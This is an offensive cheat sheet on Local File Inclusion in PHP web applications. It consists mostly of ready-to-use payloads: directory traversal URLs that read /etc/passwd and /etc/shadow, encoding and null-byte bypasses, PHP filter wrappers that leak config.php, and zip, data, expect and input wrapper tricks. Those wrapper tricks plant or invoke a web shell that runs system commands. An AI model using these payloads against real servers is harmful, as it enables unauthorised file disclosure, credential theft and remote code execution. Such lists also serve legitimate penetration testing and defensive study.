## Local File Inclusion (LFI)

## Introduction
Local File Inclusion is an attack technique in which attackers trick a web application into either running or exposing files on a web server

## Where to find
- Any endpoint that includes a file from a web server. For example, `/index.php?page=index.html`

## How to exploit
1. Basic payload
```
http://example.com/index.php?page=../../../etc/passwd
http://example.com/index.php?page=../../../../../../../../../../../../etc/shadow
```

2. URL encoding
```
http://example.com/index.php?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

3. Double encoding
```
http://example.com/index.php?page=%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

4. UTF-8 encoding
```
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
```

5. Using Null Byte (%00)
```
http://example.com/index.php?page=../../../etc/passwd%00
```

6. From an existent folder
```
http://example.com/index.php?page=scripts/../../../../../etc/passwd
```

7. Path truncation
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
```

8. Using PHP Wrappers: filter
```
http://example.com/index.php?page=php://filter/read=string.rot13/resource=config.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=config.php
```

9. Using PHP Wrappers: zlib
```
http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/shadow
```

10. Using PHP Wrappers: zip
```
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php
```

11. Using PHP Wrappers: data
```
http://example.com/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
```

12. Using PHP Wrappers: expect
```
http://example.com/index.php?page=expect://ls
```

13. Using PHP Wrappers: input
```
POST /index.php?page=php://input&cmd=ls HTTP/1.1
Host: example.com
...

<?php echo shell_exec($_GET['cmd']); ?>
```

14. Some unique bypass
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
http://example.com/index.php?page=/.%2e/.%2e/.%2e/.%2e/etc/passwd
http://example.com/index.php?page=/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd
```

## References
* [Aptive](https://www.aptive.co.uk/blog/local-file-inclusion-lfi-testing/)